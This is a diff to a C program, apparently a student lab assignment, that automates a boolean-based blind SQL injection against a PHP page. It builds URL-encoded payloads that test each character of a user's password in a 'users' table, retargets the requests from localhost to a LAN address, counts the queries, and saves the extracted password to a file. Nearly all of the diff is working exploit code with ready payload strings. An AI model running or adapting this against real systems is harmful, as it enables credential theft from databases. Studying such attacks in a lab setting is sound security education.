@@ -3,6 +3,7 @@
 #include <string.h>
 #include <unistd.h>
 #include <arpa/inet.h>
+#include <ctype.h>
 
 #define MAX_PASSWORD_LENGTH 10
 #define STUDENT_ID "315177444"  // Replace with your actual ID
@@ -21,7 +22,7 @@ int send_request_and_check(char *payload) {
     // Construct the full HTTP request
     snprintf(request, sizeof(request),
              "GET /index.php?order_id=%s HTTP/1.1\r\n"
-             "Host: localhost\r\n"
+             "Host: 192.168.1.202\r\n"
              "Connection: close\r\n\r\n",
              payload);
 
@@ -60,13 +61,19 @@ int send_request_and_check(char *payload) {
     response[received] = '\0';  // Null-terminate response
 
     close(sock);
-
     // Check if the response contains the success message
     return strstr(response, "Your order has been sent!") != NULL;
 }
 
+void generate_payload(int position, int ascii_value, char* user_id, char *output) {
+    snprintf(output, 512,
+        "2+AND+(SELECT+ASCII(SUBSTRING(password%%2C%d%%2C1))+%%3D+0x%X+FROM+users+WHERE+id%%3D%s)%%3B+--",
+        position, ascii_value, user_id);
+}
+
 // Function to extract password character by character
 void extract_password() {
+
     char password[MAX_PASSWORD_LENGTH + 1] = {0};
     FILE *file = fopen(OUTPUT_FILE, "w");
     if (!file) {
@@ -75,16 +82,14 @@ void extract_password() {
     }
 
     printf("Starting Blind SQL Injection attack...\n");
-
+    int querry_count = 0;
     for (int pos = 1; pos <= MAX_PASSWORD_LENGTH; pos++) {
         for (char ch = ASCII_START; ch <= ASCII_END; ch++) {
             char payload[256];
 
-            // Construct SQL Injection payload
-            snprintf(payload, sizeof(payload),
-                     "1' AND (SELECT ASCII(SUBSTRING(password,%d,1))=%d FROM users WHERE id=%s) -- ",
-                     pos, ch, STUDENT_ID);
-
+            // generate payload
+            generate_payload(pos, ch, STUDENT_ID, payload);
+            querry_count+=1;
             // Send request and check if character is correct
             if (send_request_and_check(payload)) {
                 password[pos - 1] = ch;
@@ -94,7 +99,7 @@ void extract_password() {
         }
         if (password[pos - 1] == 0) break;  // Stop if no more characters found
     }
-
+    printf("number of querries sent: %d\n", querry_count);
     // Save extracted password
     fprintf(file, "*%s*", password);
     fclose(file);
@@ -103,8 +108,24 @@ void extract_password() {
 }
 
 int main() {
-    int x = send_request_and_check("1%27%20AND%20(SELECT%20ASCII(SUBSTRING(password,1,1))%3D32%20FROM%20users%20WHERE%20id%3D315177444)%20--%20");
-    printf("%d\n", x);
-    //extract_password();
+
+    char payload[512]; 
+    int x = send_request_and_check("2 AND (SELECT ASCII(SUBSTRING(password,1,1)) = 0x35 FROM users WHERE id=315177444); --");
+    printf("draft code%d\n", x);
+    x = send_request_and_check("2+AND+(SELECT+ASCII(SUBSTRING(password%2C1%2C1))+%3D+0x35+FROM+users+WHERE+id%3D315177444)%3B+--");
+    printf("working payload: %s", "2+AND+(SELECT+ASCII(SUBSTRING(password%2C1%2C1))+%3D+0x35+FROM+users+WHERE+id%3D315177444)%3B+--\n");
+
+    generate_payload(1, 0x35, "315177444", payload);
+    printf("encoded payload: %s\n", payload);
+    printf("working first char %d\n", x);
+    
+    generate_payload(2, 0x49, "315177444", payload);
+    x = send_request_and_check(payload);
+    printf("working second char %d\n", x);
+    
+    generate_payload(3, 0x49, "315177444", payload);
+    x = send_request_and_check(payload);
+    printf("not working third char %d\n", x);
+    extract_password();
     return 0;
 }
